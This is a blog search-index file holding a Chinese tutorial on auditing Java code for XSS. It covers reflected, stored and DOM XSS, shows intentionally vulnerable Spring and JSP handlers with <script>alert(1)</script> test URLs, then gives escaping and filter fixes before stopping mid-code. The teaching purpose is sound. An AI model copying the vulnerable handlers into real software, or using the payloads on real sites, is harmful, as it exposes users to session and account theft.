<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>java源代码审计-XSS注入</title>
    <link href="/2023/02/05/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-XSS%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/02/05/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-XSS%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h3><ol><li><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p> XSS被称为跨站脚本攻击（Cross Site Scripting），由于和层叠样式表（Cascading Style Sheets，CSS）重名，改为XSS。</p><p> 主要基于JavaScript语言进行恶意攻击，因为js非常灵活操作html、css、浏览器。</p><p> 1）<strong>定义/原理</strong>：跨站脚本（Cross-Site Scripting），本应该缩写为CSS，但是该缩写已被层叠样式脚本Cascading Style Sheets所用，所以改简称为XSS。也称跨站脚本或跨站脚本攻击。跨站脚本攻击XSS通过将恶意得Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p> 2）<strong>本质</strong>：是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种 。</p><p> 3）<strong>特点</strong>：XSS主要基于<strong>JavaScript</strong>完成恶意的攻击行为，由于JS可以非常灵活地操作html、css和浏览器，使得跨站脚本攻击的“想象”空间特别大。</p><p> 4）<strong>攻击对象</strong>：被攻击者的浏览器。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然后浏览器不会判断代码是否恶意，也就是说xss的对象是用户的浏览器。</p><p> 微博、留言板、聊天室等等<strong>收集用户输入</strong>的地方，都可能被注入xss代码，都存在遭受xss的风险，只要没有对用户的输入进行严格过滤，就会被xss。当攻击者可以将恶意代码注入到服务器中，我们就认为其存在xss漏洞。</p><p> 5）<strong>一般的攻击过程</strong>：</p><ul><li>  攻击者将恶意代码注入到服务器中（如论坛、留言板、邮件等）；</li><li>  用户在没有防备的情况下访问了被注入了恶意代码的服务器；</li><li>  服务器将含有恶意代码的网页响应给客户端；</li><li>  在客户端浏览器中触发JS恶意代码。</li></ul></li><li><h4 id="XSS漏洞危害"><a href="#XSS漏洞危害" class="headerlink" title="XSS漏洞危害"></a>XSS漏洞危害</h4><p> 恶意用户利用xss代码攻击成功后，可能会得到很高的权限，XSS漏洞主要有以下危害：<br> （1）盗取各种用户账号；<br> （2）窃取用户Cookie资料，冒充用户身份进入网站；<br> （3）劫持用户会话，执行任意操作；是指操作用户浏览器；<br> （4）刷流量，执行弹窗广告；<br> （5）传播蠕虫病毒。<br> 等等</p></li><li><h4 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h4><p> XSS漏洞大概可以分为三个类型：反射型XSS、存储型XSS和DOM型XSS。</p><h5 id="3-1-反射型XSS"><a href="#3-1-反射型XSS" class="headerlink" title="3.1 反射型XSS"></a>3.1 反射型XSS</h5><p> <strong>定义</strong>：反射型XSS是非持久性、参数型跨站脚本。反射型XSS的JS代码在web应用的参数（变量）中，如搜索框的反射型XSS。</p><p> <strong>特点</strong>：这种攻击方式往往具有一次性。</p><p> <strong>攻击方式</strong>：攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后，就会触发xss漏洞。</p><h6 id="3-2-存储型XSS"><a href="#3-2-存储型XSS" class="headerlink" title="3.2 存储型XSS"></a>3.2 存储型XSS</h6><p> <strong>定义</strong>：存储型XSS是持久性跨站脚本，持久性体现在xss代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。存储型XSS通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。</p><p> <strong>特点</strong>：攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。</p><p> <strong>攻击方式</strong>：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中 。 当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行 。所以需要浏览器从服务器载入恶意的xss代码，才能真正触发xss。</p><p> <strong>反射型与存储型xss对比</strong>：<br> 如果我们能够谨慎对待不明链接，那么反射型XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入在一些我们信任的页面，因此无论我们多么小心，都难免会受到攻击。</p><h5 id="3-3-DOM型XSS"><a href="#3-3-DOM型XSS" class="headerlink" title="3.3 DOM型XSS"></a>3.3 DOM型XSS</h5><h6 id="3-3-1-节点树模型"><a href="#3-3-1-节点树模型" class="headerlink" title="3.3.1 节点树模型"></a>3.3.1 节点树模型</h6><p> DOM全称Document Object Model，中文为文档对象模型，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式 。<br> HTML 的标签都是节点，而这些节点组成了 DOM 的整体结构一一节点树。通过HTML DOM，树中的所有节点均可通过JavaScript进行访问 。 所有HTML元素（节点）均可被修改，也可以创建或删除节点 。</p><h6 id="3-3-2-DOM型XSS"><a href="#3-3-2-DOM型XSS" class="headerlink" title="3.3.2 DOM型XSS"></a>3.3.2 DOM型XSS</h6><p> <strong>定义</strong>：DOM型XSS比较特殊。owasp关于DOM型XSS的定义是基于DOM的XSS是一种XSS攻击，其中攻击的payload由于修改受害者浏览器页面的DOM树而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM型XSS比较难以检测。</p><p> 通过<a href="https://www.runoob.com/htmldom/htmldom-tutorial.html">菜鸟教程</a>的一张图片来了解一下DOM树</p><p> <img src="./java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-XSS%E6%B3%A8%E5%85%A5/DOMTREE.gif" alt="DOMTREE"></p> <img src="/2023/02/05/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-XSS%E6%B3%A8%E5%85%A5/DOMTREE.gif" class="" title="java源代码审计-XSS注入"><p> <strong>网页的生成及修改</strong>：</p><p> 在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件 。</p><p> 可以通过JS脚本对文档对象进行编辑，从而修改页面的元素 。 也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的xss漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。<br> <strong>攻击方式</strong>：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。 当用户的浏览器处理这个响应时， DOM对象就会处理XSS代码，导致存在XSS漏洞 。</p><p> PS:关于漏洞验证与漏洞利用方向，可以参考之前记录的一篇文章<a href="https://cayce-atlantis.github.io/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/">XSS攻击通关之路</a></p></li></ol><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><ol><li><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1. </span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Vuln Code.</span><br><span class="hljs-comment">     * ReflectXSS</span><br><span class="hljs-comment">     * http://localhost:8080/xss/reflect?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> xss unescape string</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/reflect&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">reflect</span><span class="hljs-params">(String xss)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> xss;<br>    &#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">客户端传入xss参数，服务端获取值后直接返回</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//2.</span><br><span class="hljs-meta">@WebServlet(&quot;/demo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xssServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.doGet(request,response);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<span class="hljs-comment">// 设置响应类型</span><br>        String content = request.getParameter(<span class="hljs-string">&quot;content&quot;</span>);  <span class="hljs-comment">//获取content传参数据</span><br>        request.setAttribute(<span class="hljs-string">&quot;content&quot;</span>, content);  <span class="hljs-comment">//content共享到request域</span><br>        request.getRequestDispatcher(<span class="hljs-string">&quot;/WEB-INF/pages/xss.jsp&quot;</span>).forward(request, response);  <span class="hljs-comment">//转发到xxs.jsp页面中</span><br><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//xss.jsp代码：</span><br>  &lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>    $&#123;requestScope.content&#125;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br>  <br><span class="hljs-comment">/**</span><br><span class="hljs-comment">和上面的情况一样，但是中间加了共享到request域，转发到目标页面，EL表达式获取直接输出</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li><li><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4> <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Vul Code.</span><br><span class="hljs-comment">     * StoredXSS Step1</span><br><span class="hljs-comment">     * http://localhost:8080/xss/stored/store?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> xss unescape string</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/stored/store&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">store</span><span class="hljs-params">(String xss, HttpServletResponse response)</span> </span>&#123;<br>        Cookie cookie = <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">&quot;xss&quot;</span>, xss);<br>        response.addCookie(cookie);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Set param into cookie&quot;</span>;<br>    &#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">客户端传入xss参数，服务端获取值后传入cookie的XSS键返回给客户端</span><br><span class="hljs-comment">*/</span><br><br><br> <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Vul Code.</span><br><span class="hljs-comment">     * StoredXSS Step2</span><br><span class="hljs-comment">     * http://localhost:8080/xss/stored/show</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> xss unescape string</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/stored/show&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;xss&quot;)</span> String xss)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> xss;<br>    &#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">前面已经将XSS写入Cookie,同一浏览器访问http://localhost:8080/xss/stored/show，服务端获取Cookie中XSS的值并返回客户端</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-comment">//2.</span><br><span class="hljs-comment">//输入点</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">StoreXss</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>        String name = req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        String mail = req.getParameter(<span class="hljs-string">&quot;mail&quot;</span>);<br>        String message = req.getParameter(<span class="hljs-string">&quot;message&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!name.equals(<span class="hljs-keyword">null</span>) &amp;&amp; !mail.equals(<span class="hljs-keyword">null</span>) &amp;&amp; !message.equals(<span class="hljs-keyword">null</span>))&#123;<br><br>            MessageInfoService msginfo = <span class="hljs-keyword">new</span> MessageInfoServiceImpl();<br>            msginfo.MessageInfoStoreService(name, mail, message);<br>          <br>            resp.getWriter().flush();<br>            resp.getWriter().close();<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//控制器</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ShowMessage</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><br>        MessageInfoService msginfo = <span class="hljs-keyword">new</span> MessageInfoServiceImpl();<br><span class="hljs-comment">//MessageInfoShowService主要是用于实例化MessageInfoDaoImpl()</span><br>        List&lt;MessageInfo&gt; msg = msginfo.MessageInfoShowService();<br>        <span class="hljs-keyword">if</span>( msg != <span class="hljs-keyword">null</span>)&#123;<br>            req.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>, msg);<br>            req.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(req, resp);<br>            <span class="hljs-keyword">return</span> ;<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//MessageInfoShowService()</span><br><span class="hljs-keyword">try</span> &#123;<br>            ....<br><span class="hljs-comment">//主要执行的是从message表中查询所有数据，然后将 name、mail、message 的值加到 messageinfo List 中，最后返回给 servlet 层。</span><br>            String sql = <span class="hljs-string">&quot;select * from message&quot;</span>;<br>            ps = conns.prepareStatement(sql);<br>            rs = ps.executeQuery();<br>            messageinfo = <span class="hljs-keyword">new</span> ArrayList&lt;MessageInfo&gt;();<br>            <span class="hljs-keyword">while</span>(rs.next())&#123;<br>                MessageInfo msg = <span class="hljs-keyword">new</span> MessageInfo();<br><br>                msg.setName(rs.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>                msg.setMail(rs.getString(<span class="hljs-string">&quot;mail&quot;</span>));<br>                msg.setMessage(rs.getString(<span class="hljs-string">&quot;message&quot;</span>));<br><br>                messageinfo.add(msg);<br>            &#125;<br><br>        ....<br><br>        <span class="hljs-keyword">return</span> messageinfo;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">return messageinfo; 把查询的name、mail、message 的值返回给List&lt;MessageInfo&gt; msg</span><br><span class="hljs-comment">req.getRequestDispatcher(&quot;/message.jsp&quot;).forward(req, resp); 转发到 message.jsp</span><br><span class="hljs-comment">*/</span> <br><br><br>&lt;%<br>  <span class="hljs-comment">//直接获取msg输出</span><br>    List&lt;MessageInfo&gt; msginfo = (ArrayList&lt;MessageInfo&gt;)request.getAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br>    <span class="hljs-keyword">for</span>(MessageInfo m:msginfo)&#123;<br> %&gt;<br>&lt;table&gt;<br><br>    &lt;tr&gt;&lt;td class=&quot;klytd&quot;&gt; 留言人：&lt;/td&gt;<br>        &lt;td class =&quot;hvttd&quot;&gt;　&lt;%=m.getName() %&gt;&lt;/td&gt;<br>    &lt;/tr&gt; <br>    &lt;tr&gt;&lt;td class=&quot;klytd&quot;&gt; e-mail：&lt;/td&gt;&lt;td class =&quot;hvttd&quot;&gt;　&lt;%=m.getMail() %&gt;&lt;/td&gt;<br>        &lt;/tr&gt;<br>    &lt;tr&gt;&lt;td class=&quot;klytd&quot;&gt; 内容：&lt;/td&gt;&lt;td class =&quot;hvttd&quot;&gt;　&lt;%=m.getMessage() %&gt;&lt;/td&gt;&lt;/tr&gt;<br><br>&lt;/table&gt; &lt;% &#125; %&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure></li><li><h4 id="安全代码"><a href="#安全代码" class="headerlink" title="安全代码"></a>安全代码</h4> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.定义转义输入字符函数</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * safe Code.</span><br><span class="hljs-comment">     * http://localhost:8080/xss/safe</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/safe&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">safe</span><span class="hljs-params">(String xss)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> encode(xss);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">encode</span><span class="hljs-params">(String origin)</span> </span>&#123;<br>        origin = StringUtils.replace(origin, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;&amp;amp;&quot;</span>);<br>        origin = StringUtils.replace(origin, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&amp;lt;&quot;</span>);<br>        origin = StringUtils.replace(origin, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&amp;gt;&quot;</span>);<br>        origin = StringUtils.replace(origin, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&amp;quot;&quot;</span>);<br>        origin = StringUtils.replace(origin, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&amp;#x27;&quot;</span>);<br>        origin = StringUtils.replace(origin, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;&amp;#x2F;&quot;</span>);<br>        <span class="hljs-keyword">return</span> origin;<br>    &#125;<br><br><br><br><span class="hljs-comment">//2.全局过滤器过滤</span><br>&lt;filter&gt;  <br>        &lt;filter-name&gt;XssSafe&lt;/filter-name&gt;  <br>        &lt;filter-<span class="hljs-class"><span class="hljs-keyword">class</span>&gt;<span class="hljs-title">XssFilter</span>&lt;/<span class="hljs-title">filter</span>-<span class="hljs-title">class</span>&gt;  </span><br><span class="hljs-class">    &lt;/<span class="hljs-title">filter</span>&gt;  </span><br><span class="hljs-class">    &lt;<span class="hljs-title">filter</span>-<span class="hljs-title">mapping</span>&gt;  </span><br><span class="hljs-class">        &lt;<span class="hljs-title">filter</span>-<span class="hljs-title">name</span>&gt;<span class="hljs-title">XssSafe</span>&lt;/<span class="hljs-title">filter</span>-<span class="hljs-title">name</span>&gt;  </span><br><span class="hljs-class">        &lt;<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;/\*&lt;/<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;   //格式问题加了个转移字符 ‘/*’</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">filter</span>-<span class="hljs-title">mapping</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">//过滤器的内容</span><br><span class="hljs-class">//<span class="hljs-title">XssFilter</span>实现：</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">public</span> <span class="hljs-title">class</span> <span class="hljs-title">XssFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span></span><br><span class="hljs-function"><span class="hljs-params">            FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>        chain.doFilter(<span class="hljs-keyword">new</span> XssHttpServletRequestWrapper((HttpServletRequest) request), response);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//XssHttpServletRequestWrapper实现</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XssHttpServletRequestWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServletRequestWrapper</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span 